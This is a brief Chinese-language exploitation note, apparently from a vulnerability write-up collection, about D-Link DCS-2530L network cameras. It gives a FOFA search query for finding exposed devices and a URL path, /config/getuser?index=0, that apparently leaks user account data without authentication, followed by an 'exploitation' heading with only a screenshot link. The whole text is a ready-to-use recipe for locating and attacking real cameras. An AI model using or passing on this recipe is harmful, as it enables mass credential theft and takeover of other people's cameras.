### 描述
fofa搜：app="D_Link-DCS-2530L"  
拼接路径：/config/getuser?index=0

### 利用
![Snipaste_2021-04-12_10-20-19.png](https://i.loli.net/2021/04/12/Qp8WEFPsRVgrcuI.png)
